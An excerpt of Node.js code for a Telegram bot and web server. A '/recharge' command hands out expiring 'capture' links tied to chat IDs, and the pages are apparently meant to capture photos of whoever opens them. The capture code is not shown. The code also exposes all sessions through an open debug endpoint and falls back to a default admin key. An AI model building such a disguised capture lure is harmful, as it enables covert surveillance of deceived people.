...
// Session Manager Class (Inline)
class SessionManager {
    constructor() {
        this.sessions = new Map();
        this.adminKey = process.env.ADMIN_KEY || 'default-admin-key';
    }

    createSession(chatId, sessionId = null) {
        ...
        console.log(`✅ Session created: ${id} for chat: ${chatId}`);
        return id;
    }
...
// Initialize bot with polling disabled by default for debugging
...
const startBotPolling = async () => {
    try {
        ...
        // Start polling if token is valid
        bot.startPolling({
            interval: 300,
            params: {
                timeout: 10
        ...
        if (error.message.includes('401')) {
            ...
            console.log('📝 Please update BOT_TOKEN environment variable');
            console.log('🔧 Bot will run in web-only mode (capture pages will work)');
        } else {
            console.log('⚠️ Bot initialization error:', error.message);
        }
    }
};

// Start bot with delay
setTimeout(startBotPolling, 2000);

// Handle polling errors
bot.on('polling_error', (error) => {
    if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
        console.log('🔄 Polling conflict detected - stopping and restarting...');
        bot.stopPolling();
        setTimeout(() => {
            bot.startPolling();
        }, 5000);
    ...
    if (error.message.includes('401')) {
        console.log('❌ Bot token authentication failed');
        return;
    }
...
app.get('/capture/:sessionId', (req, res) => {
    ...
    console.log(`📊 Current active sessions: ${photoSessions.size}`);
    console.log(`🗂️ All session IDs: ${Array.from(photoSessions.keys())}`);
    
    // Check session in both old and new system
    let sessionData = photoSessions.get(sessionId) || sessionManager.getSession(sessionId);
    
    if (!sessionData) {
        console.log(`❌ Session ${sessionId} not found in either system`);
        
        // Try to create a fallback session for debugging
        if (req.query.debug === '1') {
            console.log(`🔧 Creating fallback session for debugging: ${sessionId}`);
            sessionData = {
                chatId: 'unknown',
                createdAt: Date.now(),
                used: false,
            ...
            photoSessions.set(sessionId, sessionData);
            sessionManager.createSession('unknown', sessionId);
        } else {
            return res.send(`
                <h1>❌ Invalid Session</h1>
                <p>यह capture link expired या invalid है।</p>
                <p>नया link बनाने के लिए bot में <strong>/recharge</strong> command भेजें।</p>
                <p><small>Session ID: ${sessionId}</small></p>
                <p><small><a href="/capture/${sessionId}?debug=1">Debug Mode</a></small></p>
            `);
        }
    }
    ...
    if (sessionAge > maxAge) {
        photoSessions.delete(sessionId); // Clean up expired session
        return res.send(`
            <h1>⏰ Session Expired</h1>
            <p>यह link 24 घंटे बाद expire हो गया है।</p>
            <p>नया link बनाने के लिए bot में <strong>/recharge</strong> command भेजें।</p>
        `);
    }
...
app.post('/register_session', async (req, res) => {
    try {
        ...
        console.log(`🔗 External session registered: ${session_id} for chat: ${chat_id}`);
        console.log(`📊 Total active sessions: ${photoSessions.size}`);
...
// Add session lookup endpoint for debugging
app.get('/debug/sessions', (req, res) => {
    const oldSessionData = Array.from(photoSessions.entries()).map(([id, data]) => ({
        sessionId: id,
        chatId: data.chatId,
        createdAt: new Date(data.createdAt).toISOString(),
        used: data.used,
    ...
    const newSessionData = sessionManager.getAllSessions();
    
    res.json({
        oldSystem: {
            totalSessions: photoSessions.size,
            sessions: oldSessionData
        },
        newSystem: newSessionData,
        combined: {
            totalSessions: photoSessions.size + newSessionData.totalSessions
        }
    });
});

// Add universal session creation endpoint
app.post('/api/create_session', (req, res) => {
    try {
        const { chat_id } = req.body;
        const sessionId = sessionManager.createSession(chat_id || 'unknown');
...
bot.onText(/recharge/, async (msg) => {
    ...
    // Get the current domain from environment or use Render domain
    let baseUrl;
    if (process.env.RENDER_SERVICE_NAME) {
        // Use Render service domain
    ...
    // Register session directly instead of making HTTP call
    photoSessions.set(sessionId, {
        chatId: chatId,
        createdAt: Date.now(),
        used: false,
    ...
    console.log(`🔗 Session registered: ${sessionId} for chat: ${chatId}`);
    console.log(`📊 Total active sessions: ${photoSessions.size}`);
